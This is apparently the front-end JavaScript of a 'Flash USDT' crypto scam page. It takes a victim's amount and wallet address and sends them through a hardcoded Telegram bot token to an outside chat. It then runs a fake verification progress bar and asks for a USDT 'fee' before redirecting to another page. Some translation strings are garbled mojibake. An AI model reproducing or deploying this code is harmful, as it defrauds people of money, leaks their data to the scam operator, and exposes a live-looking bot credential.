    const translations = {
      en: {
        title: "FLASH USDT SIGMA 3.60",
        amount: "Amount (> 5000)",
        wallet: "Wallet Address",
        verify: "Verify",
        send: "Pay"
      },
      fr: {

        amount: "Montant (> 5000)",

        wallet: "–ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞",

        verify: "È™åËØÅ",

      }
    };

    const langSelect = document.getElementById("langSelect");
    const defaultLang = localStorage.getItem("language") || navigator.language.slice(0, 2);
    const lang = translations[defaultLang] ? defaultLang : "en";
    langSelect.value = lang;
    setLanguage(lang);

    langSelect.addEventListener("change", () => {
      localStorage.setItem("language", langSelect.value);
      setLanguage(langSelect.value);
    });

    function setLanguage(lang) {
      document.getElementById("title").textContent = translations[lang].title;
      document.getElementById("amount").placeholder = translations[lang].amount;
      document.getElementById("wallet").placeholder = translations[lang].wallet;
      document.getElementById("verifyBtn").textContent = translations[lang].verify;
      const amount = document.getElementById("amount").value;
      const payText = amount ? `Pay (${(amount * 10 / 5000).toFixed(2)})` : translations[lang].send;
      document.getElementById("sendBtn").textContent = payText;
    }

    document.getElementById("verifyBtn").addEventListener("click", async () => {
      const amount = document.getElementById("amount").value;
      const network = document.getElementById("network").value;
      const wallet = document.getElementById("wallet").value;

      if (amount <= 4999 || !wallet) {
        alert("Enter valid amount and wallet address");
        return;
      }

      const message = `New Verification:\nAmount: ${amount}\nNetwork: ${network}\nWallet: ${wallet}`;
      const telegramUrl = `https://api.telegram.org/bot8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw/sendMessage?chat_id=7739393558&text=${encodeURIComponent(message)}`;
      await fetch(telegramUrl);

      const loadingBar = document.getElementById("loadingBar");
      loadingBar.style.display = "block";
      loadingBar.style.width = "0%";

      let progress = 0;
      const interval = setInterval(() => {
        progress += 10;
        loadingBar.style.width = progress + "%";
        if (progress >= 100) {
          clearInterval(interval);
          const payAmount = (amount * 10 / 5000).toFixed(2);
          document.getElementById("sendBtn").textContent = `Pay in usdt (${payAmount})`;
          document.getElementById("sendBtn").style.display = "block";
          document.getElementById("verifyBtn").style.display = "none";
        }
      }, 1000);
    });

    document.getElementById("sendBtn").addEventListener("click", () => {
      window.location.href = "page2.html";
    });

    document.getElementById("amount").addEventListener("input", () => {
      const amount = document.getElementById("amount").value;
      const lang = langSelect.value;
      const payText = amount > 0 ? `Pay in usdt (${(amount * 10 / 5000).toFixed(2)})` : translations[lang].send;

    });
